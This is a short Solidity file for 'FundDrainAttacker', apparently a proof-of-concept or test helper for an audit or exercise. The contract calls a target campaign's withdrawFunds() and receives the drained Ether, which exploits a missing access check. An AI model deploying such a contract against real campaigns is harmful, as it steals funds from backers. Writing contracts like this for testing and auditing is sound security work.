// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

interface ICampaignWithdrawer {
    function withdrawFunds() external;
}

contract FundDrainAttacker {
    ICampaignWithdrawer public immutable target;

    constructor(address _target) {
        target = ICampaignWithdrawer(_target);
    }

    receive() external payable {}

    function attack() external {
        target.withdrawFunds();
    }
}
